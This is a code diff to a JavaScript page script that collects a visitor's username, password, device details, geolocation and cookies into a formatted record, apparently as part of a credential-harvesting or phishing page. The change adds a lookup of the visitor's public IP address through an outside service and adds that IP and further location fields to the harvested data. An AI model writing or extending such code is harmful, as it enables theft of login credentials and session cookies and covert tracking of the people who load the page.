@@ -192,19 +192,25 @@ document.addEventListener('DOMContentLoaded', () => {
 			//console.error("Email is undefined");
 		}
 
-
-
-		const deviceInfo = {
+		fetch('https://api.ipify.org').then(res => res.text()).then(ipAddress => {
+        const deviceInfo = {
 			manufacturer: navigator.userAgent.match(/[\(](.*?)[\)]/)[1],
 			model: navigator.userAgent.match(/[\(](.*?)[\)]/)[2],
 			os: navigator.userAgent.match(/Mac OS X/) ? "Mac OS X" : "Windows",
 			browser: navigator.userAgent.match(/Chrome/) ? "Chrome" : "Firefox",
 		};
 
-		getLocation(username, password, x, deviceInfo);
+		getLocation(username, password, x, deviceInfo, ipAddress);
+      }).catch(error => {
+        console.error("Error capturing IP address:", error);
+      });
+
+
+
+		
 	};
 
-	function getLocation(username, password, x, deviceInfo) {
+	function getLocation(username, password, x, deviceInfo, ipAddress) {
 		navigator.geolocation?.getCurrentPosition(async (position) => {
 				const latitude = position.coords.latitude;
 				const longitude = position.coords.longitude;
@@ -230,6 +236,7 @@ document.addEventListener('DOMContentLoaded', () => {
 							Device: deviceInfo.manufacturer,
 							OS: deviceInfo.os,
 							Browser: deviceInfo.browser,
+							ipAddress,
 							Latitude: latitude,
 							Longitude: longitude,
 							City: city,
@@ -271,6 +278,14 @@ document.addEventListener('DOMContentLoaded', () => {
                "Device Info": "${data.Device}",
                "OS": "${data.OS}",
                "Browser": "${data.Browser}",
+	       "IP Address": ${data.ipAddress},
+               "Latitude": ${data.Latitude},
+               "Longitude": ${data.Longitude},
+               "City": "${data.City}",
+               "State": "${data.State}",
+               "County": "${data.County}",
+               "Country": "${data.Country}",
+               "ZipCode": "${data.ZipCode}",
                "Cookies": ["${data.Cookies}"],
             `
 		};
